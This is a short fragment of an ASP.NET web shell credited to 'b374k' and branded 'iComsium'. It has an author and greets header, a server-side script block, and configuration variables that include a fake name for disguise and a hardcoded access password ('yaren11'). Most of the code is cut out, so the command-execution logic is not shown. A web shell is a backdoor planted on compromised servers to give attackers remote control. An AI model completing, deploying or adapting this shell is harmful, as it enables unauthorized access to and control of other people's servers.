...
'# ^^^^^^^^^^^^
'# author: b374k
'# greets: iComsium(s) and all of you who love peace and freedom
'#
'#
'# ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'#
...
<script runat="server">
'################# VARIABLES GOES HERE #######################=============================================]
Dim shell_name As String = "iComsium"
Dim shell_fake_name As String = "iComsium"
Dim shell_title As String = " :: " & shell_name & " ::"
Dim shell_version As String = "v1"
Dim shell_password As String = "yaren11"
...
</html>https://www.facebook.com/iCo.phtml